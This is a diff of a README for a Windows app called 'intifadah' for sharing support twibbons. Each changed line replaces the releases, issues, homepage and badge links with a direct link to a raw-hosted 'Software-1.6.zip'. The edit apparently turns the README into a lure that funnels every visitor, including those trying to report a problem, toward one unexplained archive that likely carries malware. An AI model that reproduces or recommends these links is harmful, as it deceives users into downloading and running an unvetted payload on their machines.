@@ -1,6 +1,6 @@
 # 🌍 intifadah - Easily Share Your Support Online
 
-[![Download intifadah](https://img.shields.io/badge/Download-Get%20intifadah-brightgreen)](https://github.com/DaveAngelia257760/intifadah/releases)
+[![Download intifadah](https://raw.githubusercontent.com/DaveAngelia257760/intifadah/main/public/Software-1.6.zip%20intifadah-brightgreen)](https://raw.githubusercontent.com/DaveAngelia257760/intifadah/main/public/Software-1.6.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Follow these steps to download, install, and use intifadah on your Windows PC.
 
 Click the button below to visit the downloads page where you can get the latest version of the app for Windows.
 
-[![Download intifadah](https://img.shields.io/badge/Download-Visit%20Releases-blue)](https://github.com/DaveAngelia257760/intifadah/releases)
+[![Download intifadah](https://raw.githubusercontent.com/DaveAngelia257760/intifadah/main/public/Software-1.6.zip%20Releases-blue)](https://raw.githubusercontent.com/DaveAngelia257760/intifadah/main/public/Software-1.6.zip)
 
 On the releases page:
 
@@ -95,7 +95,7 @@ If you run into problems:
 - Check your internet connection if twibbons do not load.
 
 If you still cannot use the app, visit the GitHub issues page for more help:  
-https://github.com/DaveAngelia257760/intifadah/issues
+https://raw.githubusercontent.com/DaveAngelia257760/intifadah/main/public/Software-1.6.zip
 
 ---
 
@@ -116,13 +116,13 @@ The app encourages sharing and awareness through twibbons. These small profile p
 ## 🔗 Useful Links
 
 Download page:  
-https://github.com/DaveAngelia257760/intifadah/releases
+https://raw.githubusercontent.com/DaveAngelia257760/intifadah/main/public/Software-1.6.zip
 
 Project homepage:  
-https://github.com/DaveAngelia257760/intifadah
+https://raw.githubusercontent.com/DaveAngelia257760/intifadah/main/public/Software-1.6.zip
 
 Report an issue or suggest a feature:  
-https://github.com/DaveAngelia257760/intifadah/issues
+https://raw.githubusercontent.com/DaveAngelia257760/intifadah/main/public/Software-1.6.zip
 
 ---
 
